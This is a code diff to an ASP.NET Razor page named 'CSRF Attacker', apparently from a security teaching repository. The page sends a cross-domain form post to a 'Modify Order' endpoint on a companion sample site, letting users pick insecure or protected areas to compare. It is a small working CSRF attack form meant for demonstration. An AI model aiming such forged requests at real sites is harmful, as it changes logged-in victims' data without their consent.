@@ -4,15 +4,19 @@
 
 <div class="jumbotron">
     <h1>CSRF Attacker</h1>
-    <p class="lead">Demonstrates CSRF attack against the "Build Secure Systems" sample website</p>
+    <p class="lead">Demonstrates CSRF attack against the "Secure Framework" sample website</p>
 	<p>
-		This will do a cross-domain form post to the "Modify Order" page on the "Build Secure Systems"
-		sample website. If you are logged into that site, and the CSRF protections are disabled,
+		This will do a cross-domain form post to the "Modify Order" page on the other sample website 
+		in this repo. If you are logged into that site, and the CSRF protections are disabled,
 		then the form post will be executed.
 	</p>
 </div>
 
 <form id="CSRFForm" action="set-by-script" method="post" target="_blank">
+
+	@*This shouldn't work, it won't match the value in the cookie*@
+	@Html.AntiForgeryToken()
+
 	<table>
 		<tr>
 			<td>Site to attack:</td>
@@ -22,6 +26,14 @@
 			</td>
 		</tr>
 		<tr>
+			<td>Which area?</td>
+			<td>
+				<label><input type="radio" name="area" value="Insecure" checked="checked" /> Insecure</label><br/>
+				<label><input type="radio" name="area" value="SecureFeature" /> Secure Feature</label><br />
+				<label><input type="radio" name="area" value="SecureFramework" /> Secure Framework</label><br />
+			</td>
+		</tr>
+		@*<tr>
 			<td>Order Id:</td>
 			<td><input type="text" name="id" value="1" size="5" /></td>
 		</tr>
@@ -32,7 +44,7 @@
 		<tr>
 			<td>Card Number:</td>
 			<td><input type="text" name="cardNumber" value="0000000000000000" size="20" /></td>
-		</tr>
+		</tr>*@
 		<tr>
 			<td></td>
 			<td><input type="submit" value="send attack" /></td>
@@ -44,7 +56,10 @@
 	$(function () {
 		$("#CSRFForm").on("submit", function () {
 			var form = $(this)[0];
-			form.action = $("#AttackHostInput").val() + "/AntiCSRF/ModifyOrderPost";
+			var host = $("#AttackHostInput").val();
+			var area = $("input[name='area']:checked").val();
+
+			form.action = host + "/" + area + "/ModifyOrder";
 		})
 	});
 </script>
